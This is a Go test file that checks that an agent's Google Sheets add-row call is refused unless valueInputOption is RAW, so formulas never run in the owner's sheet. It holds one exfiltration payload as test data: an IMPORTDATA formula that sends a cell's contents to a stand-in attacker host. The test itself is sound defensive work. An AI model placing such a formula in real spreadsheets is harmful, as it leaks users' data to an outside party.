package planque

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"testing"

	"github.com/kiff/planque/internal/appcredentials"
	"github.com/kiff/planque/internal/profile"
)

// The shipped app's schema allows only RAW for valueInputOption. A call
// that sets USER_ENTERED (formulas run in the owner's sheet) must not reach
// Google with it.
func TestGoogleSheetsAddRowNeverSendsAFormulaMode(t *testing.T) {
	e := newInProcessEnv(t)
	e.enrol()
	ctx := context.Background()
	e.s.Applications = shippedApps(t)
	credentials := &appcredentials.Sealed{KV: e.kv, Sealer: e.s.Sealer}
	if err := credentials.Put(ctx, "googlesheets", appcredentials.Credentials{ClientID: "demo-client", Secret: "demo-secret"}); err != nil {
		t.Fatal(err)
	}
	e.s.ApplicationCredentials = credentials
	raw, _ := os.ReadFile("../../deploy/catalog.json")
	var err error
	if e.s.CatalogEntries, err = DecodeCatalog(raw, e.s.Applications); err != nil {
		t.Fatal(err)
	}
	var mu sync.Mutex
	var sent []string
	transport := applicationTransport(func(r *http.Request) (*http.Response, error) {
		mu.Lock()
		defer mu.Unlock()
		body := `{}`
		switch {
		case r.URL.Host == "oauth2.googleapis.com":
			body = `{"access_token":"a","refresh_token":"r","token_type":"Bearer","expires_in":3600}`
		case r.URL.Host == "sheets.googleapis.com":
			b, _ := io.ReadAll(r.Body)
			sent = append(sent, r.Method+" "+r.URL.String()+" "+string(b))
			body = `{"updates":{}}`
		}
		return &http.Response{StatusCode: 200, Header: make(http.Header), Body: io.NopCloser(strings.NewReader(body))}, nil
	})
	base := e.client.Transport
	e.client.Transport = applicationTransport(func(r *http.Request) (*http.Response, error) {
		if r.URL.Host != "kiff.example" || r.URL.Path != "/v1/profiles" {
			return base.RoundTrip(r)
		}
		var in struct {
			Profile json.RawMessage `json:"profile"`
		}
		_ = json.NewDecoder(r.Body).Decode(&in)
		hash, _ := profile.Digest(in.Profile)
		return profileResponse(200, `{"revision":1,"profile_sha256":"`+hash+`","words_sha256":"`+strings.Repeat("a", 64)+`"}`), nil
	})
	e.s.OAuth.HTTP = &http.Client{Transport: transport}
	e.s.REST.HTTP = &http.Client{Transport: transport}

	st, out := e.do("POST", "/v1/accounts/"+tenant+"/catalog/googlesheets@1/grants", map[string]string{"agent": "agt_taf"}, nil, "k_setup")
	if st != 201 {
		t.Fatalf("grant: %d %v", st, out)
	}
	id := out["grant"].(map[string]any)["id"].(string)
	gr, _ := e.s.loadGrant(ctx, tenant, id)
	hash, _ := profile.Digest(gr.Request.Profile)
	path := "/v1/accounts/" + tenant + "/grants"
	st, approved := e.do("POST", path+"/"+id+"/approve", map[string]any{"digest": gr.Digest, "kiff_profile": ProfileDigests{ProfileSHA256: hash, WordsSHA256: strings.Repeat("a", 64)}}, e.phone, "")
	if st != 200 {
		t.Fatalf("approve: %d %v", st, approved)
	}
	authURL, _ := url.Parse(approved["sign_in_url"].(string))
	code := e.signIn(e.url + "/oauth/callback?state=" + url.QueryEscape(authURL.Query().Get("state")) + "&code=demo-code")
	if st, out = e.do("POST", path+"/"+id+"/confirm", map[string]string{"confirm": code}, e.phone, ""); st != 200 {
		t.Fatalf("confirm: %d %v", st, out)
	}
	e.kiff.Cards["k_taf"]["google_sheets_add_row"] = 0
	cell := `=IMPORTDATA("https://evil.example/?"&A1)`
	call := func(opt string) string {
		args := map[string]any{"spreadsheetId": "s1", "range": "Sheet1!A1:B1", "values": []any{[]any{cell, "x"}}}
		if opt != "" {
			args["valueInputOption"] = opt
		}
		res, err := e.kiff.Call(ctx, "k_taf", "google_sheets_add_row", args)
		if err != nil {
			t.Fatal(err)
		}
		return mustJSONString(res)
	}
	// A mode the app doesn't list, and none at all, are refused: nothing reaches Google.
	for _, opt := range []string{"USER_ENTERED", "SOMETHING_ELSE", ""} {
		if got := call(opt); !strings.Contains(got, "Nothing was sent") {
			t.Errorf("valueInputOption %q wasn't refused: %s", opt, got)
		}
	}
	mu.Lock()
	if len(sent) != 0 {
		t.Fatalf("Google got a request from a refused call: %v", sent)
	}
	mu.Unlock()
	// The one mode it lists goes through, as sent.
	if got := call("RAW"); strings.Contains(got, "Refused") {
		t.Fatalf("RAW refused: %s", got)
	}
	mu.Lock()
	defer mu.Unlock()
	if len(sent) != 1 || !strings.Contains(sent[0], "valueInputOption=RAW") || strings.Contains(sent[0], "USER_ENTERED") {
		t.Fatalf("what Google got: %v", sent)
	}
}
